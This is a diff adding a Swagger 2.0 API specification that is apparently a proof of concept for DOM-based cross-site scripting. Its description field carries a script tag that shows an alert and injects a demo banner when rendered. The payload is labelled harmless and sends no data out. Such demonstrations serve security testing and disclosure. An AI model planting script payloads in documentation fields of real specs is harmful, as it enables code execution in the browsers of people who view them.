@@ -1,0 +1,19 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "PoC: DOM XSS Demo (Safe)",
+    "version": "1.0.0",
+    "description": "<script>try{alert('DOM XSS demo: harmless alert - no data exfiltration');document.body.insertAdjacentHTML('afterbegin','<div style=\"background:#ffefc0;padding:12px;border:1px solid #e6c07a;font-family:sans-serif;\">DEMO: This page was modified by injected script (safe demo).</div>');}catch(e){}<\/script>"
+  },
+  "paths": {
+    "/": {
+      "get": {
+        "responses": {
+          "200": {
+            "description": "Safe PoC displayed"
+          }
+        }
+      }
+    }
+  }
+}
